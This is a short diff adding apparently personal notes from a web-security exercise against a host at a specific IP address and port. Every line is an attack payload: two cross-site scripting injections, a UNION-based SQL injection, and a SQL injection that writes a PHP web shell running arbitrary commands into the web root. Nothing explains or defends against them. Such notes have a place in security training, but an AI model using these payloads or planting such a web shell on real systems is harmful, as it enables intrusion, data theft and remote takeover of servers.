@@ -1,0 +1,4 @@
+XSS 1 - http://141.85.224.104:50001/index.php?id=324%3C/p%3E%3Cscript%3Ealert(1);%3C/script%3E%3Cp%3E
+XSS 2 - login form: username</div><script>alert(1);</script><div>
+SQLi - id=1 union select 1,2,3,4;--
+SQLi to RCE - http://141.85.224.104:50001/index.php?id=1 union select 1,2,3,"<?php system($_GET['cmd']); ?>" into dumpfile '/var/www/html/rce.php'
